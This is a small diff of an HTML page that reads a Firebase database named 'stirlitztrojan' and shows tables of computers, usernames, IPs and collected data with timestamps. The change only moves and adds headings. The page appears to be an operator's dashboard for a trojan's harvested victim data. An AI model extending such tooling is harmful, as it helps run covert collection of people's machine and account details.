@@ -9,7 +9,6 @@
     <script src="firebase-auth-client.js"></script>
   </head>
   <body>
-    <h1>Users:</h1>
     <div id="data"></div>
     <div id="err"></div>
     <p>Copyright 2016 "I"</p>
@@ -17,8 +16,10 @@
     <!--
     var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/" + prompt("Password:"));
     firebase.on("value", function(snapshot) {
-      var table, rows, color;
+      var h1, table, rows, color;
       
+      document.getElementById("data").appendChild(h1 = document.createElement("H1"));
+      h1.innerHTML = "Users:";
       var tableRow, tableCellComputer, tableCellUsername, tableCellIp;
       document.getElementById("data").appendChild(table = document.createElement("TABLE"));
       tableRow = table.insertRow(0);
@@ -59,6 +60,8 @@
         }
       }
       
+      document.getElementById("data").appendChild(h1 = document.createElement("H1"));
+      h1.innerHTML = "Data:";
       var tableCellData, tableCellTime, tableCellDate;
       document.getElementById("data").appendChild(table = document.createElement("TABLE"));
       tableRow = table.insertRow(0);
